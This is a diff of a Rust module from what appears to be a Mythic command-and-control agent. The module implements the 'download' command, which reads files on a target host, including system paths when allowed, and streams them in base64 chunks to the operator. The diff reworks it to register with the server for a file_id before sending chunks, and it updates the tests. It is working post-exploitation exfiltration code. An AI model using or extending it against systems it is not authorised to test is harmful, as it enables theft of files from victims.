@@ -1,15 +1,13 @@
-//! File download (agent → Mythic) — multi-chunk, streaming.
+//! File download (agent -> Mythic) - multi-chunk, streaming.
 //!
-//! Reads the file in fixed-size chunks from disk and emits one [`TaskDownload`]
-//! response per chunk, all sharing a single `file_id`. Mythic reassembles them
-//! into a single file on the operator side.
+//! Registers the file with Mythic first, waits for the Mythic-assigned
+//! `file_id`, then streams chunks using that server-side identifier.
 //!
 //! Memory usage: bounded to [`DEFAULT_CHUNK_SIZE`] regardless of file size —
 //! safe for files larger than available RAM.
 //!
-//! Multi-response emission: chunk responses are pushed via [`crate::push_extra`]
-//! and the agent loop appends them to the next `get_tasking` round. The single
-//! `TaskResponse` returned by `handle` is the final summary.
+//! The agent loop must post the registration response through `post_response`
+//! so it can receive the response receipt containing `file_id`.
 //!
 //! Task parameters (JSON):
 //! ```json
@@ -26,16 +24,16 @@
 //! every `download`.
 
 use std::fs::File;
-use std::io::Read;
+use std::io::{Read, Seek, SeekFrom};
 use std::path::Path;
 
 use base64::Engine;
-use mythic::{TaskDownload, TaskMessage, TaskResponse};
+use mythic::{Artifact, TaskDownload, TaskMessage, TaskResponse};
 use serde::Deserialize;
 use uuid::Uuid;
 
 use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
-use crate::push_extra;
+use crate::dispatch::PostResponseReceipt;
 
 // ── Params ──────────────────────────────────────────────────
 
@@ -48,6 +46,8 @@ struct Params {
     /// When true, allow exfiltrating system paths (default false).
     #[serde(default)]
     allow_system_path: bool,
+    #[serde(default)]
+    host: Option<String>,
 }
 
 // ── Constants ───────────────────────────────────────────────
@@ -64,11 +64,26 @@ struct DownloadMeta {
     chunk_size: u32,
     filename: String,
     full_path: String,
-    file_id: Uuid,
+    host: Option<String>,
+    total_size: u64,
+    path_str: String,
+    file_id: Option<Uuid>,
+    next_chunk: u32,
 }
 
-fn push_download_chunk(meta: &DownloadMeta, chunk_num: u32, encoded: String, is_last: bool) {
-    push_extra(TaskResponse {
+thread_local! {
+    static PENDING_DOWNLOADS: std::cell::RefCell<std::collections::HashMap<Uuid, DownloadMeta>> =
+        std::cell::RefCell::new(std::collections::HashMap::new());
+}
+
+fn download_chunk_response(
+    meta: &DownloadMeta,
+    file_id: Uuid,
+    chunk_num: u32,
+    encoded: String,
+    is_last: bool,
+) -> TaskResponse {
+    TaskResponse {
         task_id: meta.task_id,
         completed: Some(is_last),
         status: Some(if is_last {
@@ -76,21 +91,152 @@ fn push_download_chunk(meta: &DownloadMeta, chunk_num: u32, encoded: String, is_
         } else {
             "processing".into()
         }),
-        user_output: None,
+        user_output: if is_last {
+            Some(format!(
+                "{} ({} bytes, {} chunks)",
+                meta.filename, meta.total_size, meta.total_chunks
+            ))
+        } else {
+            None
+        },
         download: Some(TaskDownload {
-            total_chunks: Some(meta.total_chunks),
             chunk_size: Some(meta.chunk_size),
             chunk_num: Some(chunk_num),
             chunk_data: Some(encoded),
-            filename: Some(meta.filename.clone()),
-            full_path: Some(meta.full_path.clone()),
-            // host left None — Mythic fills it from the callback
-            host: None,
+            host: meta.host.clone(),
             is_screenshot: false,
-            file_id: Some(meta.file_id),
+            file_id: Some(file_id),
+            ..Default::default()
         }),
         ..Default::default()
-    });
+    }
+}
+
+fn next_download_chunk(meta: &DownloadMeta, file_id: Uuid, chunk_num: u32) -> TaskResponse {
+    if chunk_num == 0 || chunk_num > meta.total_chunks {
+        return TaskResponse::failed(
+            meta.task_id,
+            &format!(
+                "download state invalid for {}: chunk {chunk_num}/{}",
+                meta.full_path, meta.total_chunks
+            ),
+        );
+    }
+
+    if meta.total_size == 0 {
+        return download_chunk_response(meta, file_id, 1, String::new(), true);
+    }
+
+    let path = Path::new(&meta.path_str);
+    let mut file = match File::open(path) {
+        Ok(f) => f,
+        Err(e) => {
+            return TaskResponse::failed(
+                meta.task_id,
+                &format!(
+                    "read {} failed after download registration: {e}",
+                    meta.full_path
+                ),
+            );
+        }
+    };
+
+    let offset = (chunk_num as u64 - 1) * meta.chunk_size as u64;
+    if let Err(e) = file.seek(SeekFrom::Start(offset)) {
+        return TaskResponse::failed(
+            meta.task_id,
+            &format!("seek {} to byte {offset} failed: {e}", meta.full_path),
+        );
+    }
+
+    let remaining = meta.total_size.saturating_sub(offset);
+    let want = remaining.min(meta.chunk_size as u64) as usize;
+    let mut buf = vec![0u8; want];
+    let mut filled = 0usize;
+    while filled < want {
+        match file.read(&mut buf[filled..want]) {
+            Ok(0) => break,
+            Ok(n) => filled += n,
+            Err(e) => {
+                return TaskResponse::failed(
+                    meta.task_id,
+                    &format!(
+                        "read {} failed at byte {}/{}: {e}",
+                        meta.full_path,
+                        offset + filled as u64,
+                        meta.total_size
+                    ),
+                );
+            }
+        }
+    }
+    if filled == 0 {
+        return TaskResponse::failed(
+            meta.task_id,
+            &format!(
+                "read {} ended before expected size at byte {offset}/{}",
+                meta.full_path, meta.total_size
+            ),
+        );
+    }
+
+    let encoded = base64::engine::general_purpose::STANDARD.encode(&buf[..filled]);
+    let is_last = chunk_num >= meta.total_chunks;
+    download_chunk_response(meta, file_id, chunk_num, encoded, is_last)
+}
+
+pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
+    let mut out = Vec::new();
+    for receipt in receipts {
+        let mut meta =
+            match PENDING_DOWNLOADS.with(|cell| cell.borrow_mut().remove(&receipt.task_id)) {
+                Some(meta) => meta,
+                None => continue,
+            };
+
+        if let Some(error) = &receipt.error {
+            out.push(TaskResponse::failed(
+                receipt.task_id,
+                &format!("download failed: {error}"),
+            ));
+            continue;
+        };
+
+        if !receipt.status.is_empty() && receipt.status != "success" {
+            out.push(TaskResponse::failed(
+                receipt.task_id,
+                &format!("download failed with status {}", receipt.status),
+            ));
+            continue;
+        }
+
+        if meta.file_id.is_none() {
+            match receipt.file_id {
+                Some(file_id) => meta.file_id = Some(file_id),
+                None => {
+                    out.push(TaskResponse::failed(
+                        receipt.task_id,
+                        "download registration did not return a Mythic file_id",
+                    ));
+                    continue;
+                }
+            }
+        };
+
+        let file_id = meta.file_id.expect("checked above");
+        let chunk_num = meta.next_chunk;
+        let response = next_download_chunk(&meta, file_id, chunk_num);
+        let completed =
+            response.completed == Some(true) || response.status.as_deref() == Some("error");
+        out.push(response);
+        if !completed {
+            meta.next_chunk += 1;
+            PENDING_DOWNLOADS.with(|cell| {
+                cell.borrow_mut().insert(meta.task_id, meta);
+            });
+        }
+    }
+    out
 }
 
 // ── Main handler ────────────────────────────────────────────
@@ -120,7 +266,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     let full_path = display_path(path);
 
     // 1. Open file and get total size
-    let mut file = match File::open(path) {
+    let file = match File::open(path) {
         Ok(f) => f,
         Err(e) => {
             return TaskResponse::failed(
@@ -147,6 +293,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             ),
         );
     }
+    let host = params.host.filter(|h| !h.trim().is_empty());
 
     // 2. Compute chunk params
     let chunk_size = params
@@ -158,10 +305,8 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     } else {
         total_size.div_ceil(chunk_size as u64) as u32
     };
-    let file_id = Uuid::new_v4();
-
     info!(
-        "[download] {} ({} bytes) → {} chunks of {} bytes",
+        "[download] {} ({} bytes) -> {} chunks of {} bytes",
         full_path, total_size, total_chunks, chunk_size
     );
 
@@ -171,76 +316,41 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         chunk_size,
         filename: filename.clone(),
         full_path: full_path.clone(),
-        file_id,
+        host: host.clone(),
+        total_size,
+        path_str: path_str.clone(),
+        file_id: None,
+        next_chunk: 1,
     };
+    PENDING_DOWNLOADS.with(|cell| {
+        cell.borrow_mut().insert(task.id, download_meta);
+    });
 
-    // 3. Stream-read each chunk, base64-encode, push as extra response.
-    //    Single read buffer reused across chunks; no seek (sequential read).
-    //    Memory is bounded to ~chunk_size regardless of file size.
-    let mut buf = vec![0u8; chunk_size as usize];
-    let mut bytes_sent: u64 = 0;
-    let mut chunk_num: u32 = 0;
-
-    if total_size == 0 {
-        chunk_num = 1;
-        push_download_chunk(&download_meta, chunk_num, String::new(), true);
-    }
-
-    while bytes_sent < total_size {
-        chunk_num += 1;
-        // Read up to the buffer's capacity, but never past the end of file.
-        let want = ((total_size - bytes_sent) as usize).min(buf.len());
-        let mut filled = 0usize;
-        while filled < want {
-            match file.read(&mut buf[filled..want]) {
-                Ok(0) => {
-                    // EOF before we hit total_size — file shrank or metadata
-                    // was stale. Treat as a clean end-of-transfer.
-                    break;
-                }
-                Ok(n) => filled += n,
-                Err(e) => {
-                    return TaskResponse::failed(
-                        task.id,
-                        &format!(
-                            "read {} failed at byte {}/{}: {e}",
-                            display_path(path),
-                            bytes_sent + filled as u64,
-                            total_size
-                        ),
-                    );
-                }
-            }
-        }
-        if filled == 0 {
-            // Nothing more to send — break the loop cleanly.
-            break;
-        }
-
-        // chunk_size in TaskDownload is the *uniform* chunk size used to
-        // pre-allocate Mythic's reassembly buffer. Sending the actual length
-        // of the (potentially smaller) last chunk confuses the server; the
-        // value must be the same on every chunk of a given transfer.
-        let encoded = base64::engine::general_purpose::STANDARD.encode(&buf[..filled]);
-        bytes_sent += filled as u64;
-        let is_last = bytes_sent >= total_size;
-
-        // Push the chunk via extras on every iteration, including the last
-        // one. Mythic's reassembly is keyed on (task_id, file_id) so the
-        // final summary `TaskResponse` (returned below) can carry the
-        // completion flag without racing with the chunk push.
-        push_download_chunk(&download_meta, chunk_num, encoded, is_last);
-    }
-
-    // Final summary
+    // Registration response. Mythic returns the authoritative file_id in the
+    // post_response receipt; chunks are generated only after that receipt.
     TaskResponse {
         task_id: task.id,
-        completed: Some(true),
-        status: Some("completed".into()),
+        completed: Some(false),
+        status: Some("processing".into()),
         user_output: Some(format!(
-            "{} ({} bytes, {} chunks)",
-            filename, total_size, chunk_num
+            "starting download of {} ({} bytes)",
+            full_path, total_size
         )),
+        artifacts: vec![Artifact {
+            base_artifact: "FileOpen".into(),
+            artifact: full_path.clone(),
+            needs_cleanup: false,
+            resolved: true,
+        }],
+        download: Some(TaskDownload {
+            total_chunks: Some(total_chunks),
+            chunk_size: Some(chunk_size),
+            filename: Some(filename),
+            full_path: Some(full_path),
+            host,
+            is_screenshot: false,
+            ..Default::default()
+        }),
         ..Default::default()
     }
 }
@@ -263,8 +373,6 @@ mod tests {
     fn test_download_empty_file_sends_one_chunk() {
         let path = temp_file("empty.bin");
         std::fs::write(&path, b"").unwrap();
-        let _ = crate::take_extra();
-
         let task = TaskMessage {
             command: "download".into(),
             parameters: serde_json::json!({ "path": path.to_string_lossy() }).to_string(),
@@ -272,16 +380,85 @@ mod tests {
         };
 
         let resp = handle(&task);
-        assert_eq!(resp.status.as_deref(), Some("completed"));
-        assert!(resp.user_output.unwrap_or_default().contains("1 chunks"));
+        assert_eq!(resp.status.as_deref(), Some("processing"));
+        let registration = resp.download.as_ref().expect("download registration set");
+        assert_eq!(registration.total_chunks, Some(1));
+        assert_eq!(registration.file_id, None);
 
-        let extras = crate::take_extra();
-        assert_eq!(extras.len(), 1);
-        let chunk = extras[0].download.as_ref().expect("download chunk set");
-        assert_eq!(chunk.total_chunks, Some(1));
+        let chunks = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(Uuid::from_u128(1)),
+            error: None,
+            ..Default::default()
+        }]);
+        assert_eq!(chunks.len(), 1);
+        let chunk = chunks[0].download.as_ref().expect("download chunk set");
+        assert_eq!(chunk.total_chunks, None);
         assert_eq!(chunk.chunk_num, Some(1));
         assert_eq!(chunk.chunk_data.as_deref(), Some(""));
-        assert_eq!(extras[0].completed, Some(true));
+        assert_eq!(chunks[0].completed, Some(true));
+
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn test_download_streams_multiple_chunks_from_receipts() {
+        let path = temp_file("multi.bin");
+        let mut data = vec![0u8; MIN_CHUNK_SIZE as usize + 17];
+        for (i, byte) in data.iter_mut().enumerate() {
+            *byte = (i % 251) as u8;
+        }
+        std::fs::write(&path, &data).unwrap();
+
+        let task = TaskMessage {
+            command: "download".into(),
+            parameters: serde_json::json!({
+                "path": path.to_string_lossy(),
+                "chunk_size": MIN_CHUNK_SIZE,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let file_id = Uuid::from_u128(2);
+
+        let registration = handle(&task);
+        let download = registration
+            .download
+            .as_ref()
+            .expect("download registration set");
+        assert_eq!(download.total_chunks, Some(2));
+        assert_eq!(download.file_id, None);
+
+        let first = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            ..Default::default()
+        }]);
+        assert_eq!(first.len(), 1);
+        assert_eq!(first[0].completed, Some(false));
+        let first_download = first[0].download.as_ref().expect("first chunk set");
+        assert_eq!(first_download.file_id, Some(file_id));
+        assert_eq!(first_download.chunk_num, Some(1));
+        assert_eq!(first_download.total_chunks, None);
+        assert_eq!(first_download.filename, None);
+        assert_eq!(first_download.full_path, None);
+
+        let second = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            ..Default::default()
+        }]);
+        assert_eq!(second.len(), 1);
+        assert_eq!(second[0].completed, Some(true));
+        let second_download = second[0].download.as_ref().expect("second chunk set");
+        assert_eq!(second_download.file_id, Some(file_id));
+        assert_eq!(second_download.chunk_num, Some(2));
+        assert_eq!(second_download.total_chunks, None);
+        assert_eq!(second_download.filename, None);
+        assert_eq!(second_download.full_path, None);
 
         let _ = std::fs::remove_file(path);
     }
